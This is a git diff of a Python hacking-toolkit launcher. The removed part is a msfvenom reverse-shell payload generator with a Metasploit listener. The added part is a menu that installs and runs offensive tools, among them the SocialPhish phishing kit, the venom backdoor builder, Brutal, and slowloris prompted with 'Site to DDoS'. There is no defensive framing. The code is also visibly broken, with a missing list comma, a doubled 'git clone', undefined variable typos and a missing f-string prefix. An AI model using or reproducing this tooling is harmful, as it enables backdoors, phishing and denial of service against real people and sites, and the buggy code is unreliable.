@@ -2,85 +2,159 @@ import os
 import sys
 
 
-# clear terminal function
+program_list = ["msf-payload-generator", "nmap-helper", "arp-discover", "RED_HAWK", "sqlmap", "setoolkit", "socialphish"
+                "subfinder", "wireshark", "brutal", "venom", "slowloris", "xsscon"]
+
+
 def clear():
     os.system("clear")
 
 
-clear()
-options = str(input("Choose option (number):\n1. Payload preset\n2. Custom payload\n3. Exit\n> "))
+def install(program):
+    if program == "msf-payload-generator":
+        os.system("cd programs/msf-payload-generator && bash install.sh")
+    elif program == "nmap-helper":
+        os.system("cd programs/nmap-helper && bash install.sh")
+    elif program == "RED_HAWK":
+        os.system("sudo apt install php")
+        os.system("cd programs && git clone git clone https://github.com/Tuhinshubhra/RED_HAWK.git")
+    elif program == "sqlmap":
+        os.system("sudo apt install sqlmap")
+    elif program == "setoolkit":
+        setoolkit_option = str(input("Install via apt or github (a/g/e, e=exit): "))
+        if setoolkit_option == "a" or setoolkit_option == "A":
+            os.system("sudo apt install set")
+        elif setoolkit_option == "g" or setoolkit_option == "G":
+            os.system("cd programs && git clone https://github.com/trustedsec/social-engineer-toolkit/")
+            os.system("cd programs && mv social-engineer-toolkit setoolkit")
+            os.system("cd programs/setoolkit && sudo python3 setup.py")
+    elif program == "socialphish":
+        os.system("cd programs && git clone https://github.com/rizzy01/SocialPhish.git")
+    elif program == "subfinder":
+        os.system("sudo apt install subfinder")
+    elif program == "wireshark":
+        os.system("sudo apt install wireshark")
+    elif program == "brutal":
+        os.system("cd programs && sudo git clone https://github.com/Screetsec/Brutal.git")
+        os.system("cd programs/Brutal && sudo chmod +x Brutal.sh")
+    elif program == "venom":
+        os.system("cd programs && git clone https://github.com/r00t-3xp10it/venom.git")
+        os.system("cd programs/venom/aux && sudo ./setup.sh && cd .. && bash venom.sh -u")
+    elif program == "slowloris":
+        os.system("sudo pip install slowloris")
+    elif program == "xsscon":
+        os.system("pip install bs4 requests")
+        os.system("cd programs && git clone https://github.com/menkrep1337/XSSCon && chmod 755 -R XSSCon")
 
-# payload generator
-clear()
-if options == "1":
-    payload_options = str(input("""Choose one of these presets:
-1. windows/meterpreter/reverse_tcp
-2. linux/x86/meterpreter/reverse_tcp
-3. cmd/unix/reverse_python
-4. cmd/unix/reverse_bash
-5. Exit
-> """))
-    if payload_options == "1":
-        payload = "windows/meterpreter/reverse_tcp"
-        clear()
-        LHOST = str(input("Host IP to connect to:\n> "))
-        clear()
-        LPORT = str(input("Port:\n> "))
-        clear()
-        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe > shell.exe")
-    elif payload_options == "2":
-        payload = "linux/x86/meterpreter/reverse_tcp"
-        clear()
-        LHOST = str(input("Host IP to connect to:\n> "))
-        clear()
-        LPORT = str(input("Port:\n> "))
-        clear()
-        os.system(f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf > shell.elf")
-    elif payload_options == "3":
-        payload = "cmd/unix/reverse_python"
-        clear()
-        LHOST = str(input("Host IP to connect to:\n> "))
-        clear()
-        LPORT = str(input("Port:\n> "))
-        clear()
-        os.system(f"msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw > shell.py")
-    elif payload_options == "4":
-        payload = "cmd/unix/reverse_bash"
-        clear()
-        LHOST = str(input("Host IP to connect to:\n> "))
-        clear()
-        LPORT = str(input("Port:\n> "))
-        clear()
-        os.system("msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw > shell.sh")
-    elif payload_options == "5":
+
+def run(program):
+    if program == "msf-payload-generator":
+        os.system("cd programs/msf-payload-generator && python3 main.py")
+    elif program == "nmap-helper":
+        os.system("cd programs/nmap-helper && python3 main.py")
+    elif program == "arp-discover":
+        os.system("arp -a")
+    elif program == "RED_HAWK":
+        os.system("cd programs/red_hawk && php rhawk.php")
+    elif program == "sqlmap":
+        sqlmap_option = str(input("Site to scan (with http/https): "))
+        os.system(f"sudo sqlmap -u {sqlmap_option}")
+    elif program == "setoolkit":
+        os.system("cd programs/setoolkit && sudo setoolkit")
+    elif program == "socialphish":
+        os.system("cd programs/socialphish && sudo bash socialphish.sh")
+    elif program == "subfinder":
+        sublist3r_option = str(input("Site to scan (e.g. example.com):"))
+        os.system(f"sudo subfinder -d {sublist3r_option}")
+    elif program == "brutal":
+        os.system("cd programs/Brutal && sudo bash Brutal.sh")
+    elif program == "venom":
+        os.system("cd programs/venom && sudo bash venom.sh")
+    elif program == "slowloris":
+        slowloris_option = str(input("Site to DDoS (e.g. example.com): "))
+        slowloris_option2 = str(input("Is the site using https? (y/n): "))
+        if slowloris_option2 == "Y" or slowloris_option2 == "Y":
+            os.system(f"slowloris {slowloris_option} --https")
+        else:
+            os.system(f"slowloris {slowloris_option}")
+    elif program == "xsscon":
+        xsscon_option = str(input("Domain: "))
+        os.system(f"cd programs/XSSCon && python3 xsscon.py -u {xsscon_option}")
+
+
+# main program
+while True:
+    clear()
+    for line in open("ascii-art.txt", "r"):
+        print(line)
+    menu_choice_0 = str(input("""Choose one of these options:
+    [1] msf payload generator
+    [2] nmap helper
+    [3] arp discover tool
+    [4] red hawk
+    [5] sqlmap
+    [6] setoolkit
+    [7] socialphish
+    [8] subfinder
+    [9] wireshark
+    [10] Brutal
+    [11] venom
+    [12] slowloris
+    [13] xsscon
+    [14] Exit
+    
+    > """))
+    if menu_choice_0 == "":
+        pass
+    elif manu_choice_0 == "14":
         sys.exit()
-elif options == "2":
-    payload = str(input("Payload to use:\n> "))
-    clear()
-    LHOST = str(input("Host IP to connect to:\n> "))
-    clear()
-    LPORT = str(input("Port:\n> "))
-    clear()
-    use_format = str(input("Use format option (y/n):\n> "))
-    if use_format == "y":
-        clear()
-        file_format = str(input("Output file format (e.g. exe):\n> "))
-    clear()
-    output = str(input("Output file name (with file name! e.g. payload.exe or mygame.py):\n> "))
-    clear()
-    if use_format == "y" or use_format == "Y":
-        print("Generating payload...")
-        os.system(f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -f {file_format} -o payloads/{output}")
-    else:
-        print("Generating payload...")
-        os.system(f"msfvenom -p {payload} LHOST={LHOST} LPORT={LPORT} -o payloads/{output}")
-elif options == "3":
-    sys.exit()
+    elif menu_choice_0 == "1":
+        while True:
+            clear()
+            print("msf payload generator is a program created by me (maghje13)!\nit uses metasploit-framework's "
+                  "msfvenom command to create a backdoor payload, and can create a listener\n "
+                  "source: https://github.com/maghje13/payload-generator\n")
+            menu_choice_1 = str(input("""Options:
+[1] Install
+[2] Run
+[3] Exit
 
-
-# create listener
-create_listener = str(input("Do you want to create a listener? (y/n):"))
-if create_listener == "y" or create_listener == "Y":
-    os.system(f"msfconsole -q -x \'use exploit/multi/handler; set payload {payload}; set LHOST {LHOST}; set LPORT {LPORT}; exploit\'")
-else:
-    sys.exit()
+> """))
+            if menu_choice_1 == "1":
+                install("msf-payload-generator")
+            elif menu_choice_1 == "2":
+                run("msf-payload-generator")
+            elif menu_choice_1 == "3":
+                break
+            else:
+                pass
+    elif menu_choice_0 == "3":
+        while True:
+            clear()
+            print("arp discover tool is a tool created by me (maghje13)!\n"
+                  "it uses the \"arp -a\" command to show all devices it can find on your network\n")
+            menu_choice_3 = str(input("""Options:
+[1] Run
+[2] Exit"""))
+            if menu_choice_3 == "1":
+                run("arp-discover")
+            elif menu_choice_3 == "2":
+                break
+            else:
+                pass
+    elif menu_choice_0 == "4":
+        while True:
+            clear()
+            print("Redhawk is a very good recon tool for scanning websites and finding vulnerabilities")
+            menu_choice_4 = str(input("""Options:
+        [1] Install
+        [2] Run
+        [3] Exit"""))
+            if manu_choice == "1":
+                install("RED_HAWK")
+            elif menu_choice_4 == "2":
+                run("RED_HAWK")
+            elif menu_choice_4 == "3":
+                break
+            else:
+                pass
